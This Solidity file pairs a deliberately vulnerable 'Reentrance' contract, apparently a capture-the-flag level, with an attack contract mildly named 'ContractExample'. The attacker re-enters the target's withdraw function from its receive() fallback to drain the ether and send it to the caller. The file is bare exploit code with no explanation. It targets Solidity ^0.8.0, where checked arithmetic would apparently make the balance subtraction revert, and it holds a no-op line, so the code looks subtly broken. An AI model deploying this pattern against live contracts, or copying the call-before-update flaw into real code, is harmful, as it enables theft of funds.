// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';

contract Reentrance {

    using SafeMath for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if(balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value:_amount}("");
            if(result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract ContractExample {

    Reentrance public ct;
    uint public withdrawAmount;

    constructor(Reentrance _ct) payable {
        ct = _ct;
    }

    /**
     * @dev Withdraws the balance of the contract and transfer to the message sender.
     */
    function emptyContract() public payable {
        // Donate to the contract
        ct.donate{value: msg.value}(address(this));

        // Withdraw the balance
        withdrawAmount = ct.balanceOf(address(this));
        ct.withdraw(withdrawAmount);

        // Send to the sender
        uint balance = address(this).balance;
        payable(msg.sender).transfer(balance);
    }

    receive() external payable {
        uint rest = address(ct).balance;
        if (rest != 0 && rest >= withdrawAmount) {
            ct.withdraw(withdrawAmount);
        } else if (rest != 0) {
            ct.withdraw(rest);
        }
    }
}